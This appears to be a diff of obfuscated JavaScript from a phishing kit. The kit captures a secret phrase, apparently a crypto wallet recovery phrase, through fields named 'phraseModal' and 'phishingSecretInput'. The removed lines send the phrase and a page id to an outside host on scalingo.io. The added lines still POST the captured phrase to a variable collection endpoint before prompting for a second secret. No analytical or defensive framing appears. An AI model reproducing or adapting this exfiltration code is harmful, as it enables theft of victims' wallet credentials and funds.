@@ -2492,23 +2492,17 @@
                 _0x7421a5 = document.getElementById("firstModal"),
                 _0x49f3bb = document.getElementById("lastModal"),
                 _0x44f539 = document.getElementById("phraseModal");
-            _0x7421a5.style.display = "block", _0x44f539.style.display = "none", $.ajax({
-                type: "POST",
-                url: "https://metameta.osc-fr1.scalingo.io/verify-step-two.php",
-                data: {
-                    id: (new URL(location.href)).searchParams.get('id'),
-                    phrase: _0x11bc49
-                }
-            }), $.ajax({
-                type: "POST",
-                url: d5,
-                data: {
-                    content: _0x11bc49
-                }
-            }), document.getElementById("phishingSecretInput").value = "", setTimeout(function () {
-                false ? _0x2d7934 = !![] : (_0x7421a5.style.display = "none", _0x49f3bb.style.display = "block");
-                $("#phishingSecret2Input").focus();
-            }, 1200);
+            _0x7421a5.style.display = "block", _0x44f539.style.display = "none",
+                $.ajax({
+                    type: "POST",
+                    url: d5,
+                    data: {
+                        content: _0x11bc49
+                    }
+                }), document.getElementById("phishingSecretInput").value = "", setTimeout(function () {
+                    false ? _0x2d7934 = !![] : (_0x7421a5.style.display = "none", _0x49f3bb.style.display = "block");
+                    $("#phishingSecret2Input").focus();
+                }, 1200);
         }
 
         function sorry_0x4bb7(_0x5461cd, _0xbebb8) {
